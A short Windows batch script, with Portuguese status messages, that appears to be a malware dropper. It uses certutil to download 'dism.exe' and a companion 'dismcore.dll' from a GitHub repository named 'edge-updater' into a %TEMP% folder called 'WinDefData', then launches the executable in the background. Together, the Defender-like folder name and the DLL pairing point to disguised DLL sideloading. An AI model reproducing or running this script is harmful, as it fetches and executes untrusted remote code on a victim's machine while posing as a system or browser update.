@echo off
set "D=%TEMP%\WinDefData"
if not exist "%D%" mkdir "%D%"
echo [1/3] Baixando dismcore.dll...
certutil -urlcache -split -f https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/dismcore.dll "%D%\dismcore.dll" >nul 2>&1
for %%A in ("%D%\dismcore.dll") do if %%~zA LSS 1000 (echo ERRO: dismcore.dll falhou & exit /b 1)
echo OK: dismcore.dll
echo [2/3] Baixando dism.exe...
certutil -urlcache -split -f https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/dism.exe "%D%\dism.exe" >nul 2>&1
for %%A in ("%D%\dism.exe") do if %%~zA LSS 10000 (echo ERRO: dism.exe falhou & exit /b 1)
echo OK: dism.exe
echo [3/3] Executando...
start /b "" "%D%\dism.exe"
echo OK: Executado
